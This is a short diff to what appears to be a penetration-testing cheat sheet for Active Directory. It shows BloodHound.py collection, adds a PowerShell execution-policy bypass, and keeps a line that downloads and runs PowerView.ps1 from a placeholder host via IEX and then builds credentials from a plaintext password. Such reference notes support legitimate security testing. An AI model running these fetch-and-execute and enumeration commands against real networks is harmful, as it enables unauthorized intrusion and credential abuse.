@@ -665,6 +665,7 @@ sudo neo4j console                          # LHOST
 sudo python3 /opt/BloodHound.py/bloodhound.py -u '{USERNAME}' -p '{PASSWORD}' -ns {IP ADDRESS} -d {DOMAIN} -c all
 
 # Powerview example
+powershell -ExecutionPolicy Bypass
 IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/PowerView.ps1")
 $pass = convertto-securestring '{PASSWORD}' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USERNAME}', $pass)
